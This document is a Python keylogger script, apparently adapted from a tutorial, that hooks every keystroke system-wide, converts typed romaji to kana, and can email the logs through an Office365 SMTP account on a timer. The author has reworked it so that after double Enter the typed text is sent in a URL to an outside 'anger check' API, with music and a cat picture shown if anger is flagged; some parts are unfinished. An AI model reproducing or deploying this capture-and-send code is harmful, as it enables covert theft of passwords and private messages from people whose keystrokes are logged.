import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import jaconv
import tkinter
import cv2
from PIL import Image, ImageTk
import requests
import json
import subprocess
from subprocess import PIPE

SEND_REPORT_EVERY = 1000 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.isEnterHasPushed = False

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = ""
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
                if (self.isEnterHasPushed):
                    self.postAPI()
                self.log = jaconv.alphabet2kana(self.log)
                self.isEnterHasPushed = not self.isEnterHasPushed
                print(self.log)
                return
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                print("backspace has called")
                self.log = self.log[:-1]
                print(self.log)
                self.isEnterHasPushed = False
                return
            else:
                # replace spaces with underscores
                name = ""
        # finally, add the key name to our global `self.log` variable
        self.log += name
        self.isEnterHasPushed = False
        print(self.log)
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            # print(jaconv.alphabet2kana(self.log), file=f)
            print("これが出てればよい")
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                # if you don't want to print in the console, comment below line
                print(f"[{self.filename}] - " + jaconv.alphabet2kana(self.log))
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

    def postAPI(self):
        print("APIコール開始")
        url = "https://lcdp003.enebular.com/resbattle-check-system-7705/?text=" + self.log  
        print("URL:" + url)      
        r = requests.get(url)
        print(r)
        print(r.text)
        json_dict = json.loads(r.text)
        print('json_dict:{}'.format(type(json_dict)))
        print(json_dict['angerFlag'])
        print("APIコール完了")
        if (json_dict["angerFlag"]):
            proc = subprocess.Popen(['python', 'music.py'], stdout=PIPE, stderr=PIPE)
            self.showCat()
            proc.kill()
        self.log = ""

    def showCat(self):
        url = "https://cataas.com/cat/says/hello%20world"
        r = requests.get(url)
        # print(r.content)
        imageURL = 'inu.png'
        # im = cv2.imread(imageURL)
        # img = Image.open(open(imageURL, 'rb'))
        # height, width, channel = im.shape
        # 画面作成
        version = tkinter.Tcl().eval('info patchlevel')
        window = tkinter.Tk()
        # window.geometry(str(height) + "x" + str(width))
        window.geometry("200x200")
        window.title("画像表示：" + version)    
        # キャンバス作成
        canvas = tkinter.Canvas(window, bg="#deb887", height=200, width=200)
        # キャンバス表示
        canvas.place(x=0, y=0)    
        # イメージ作成
        img = tkinter.PhotoImage(file=imageURL, width=200, height=200)
        # キャンバスにイメージを表示
        canvas.create_image(0, 0, image=img, anchor=tkinter.NW)    
        window.mainloop()
    
if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()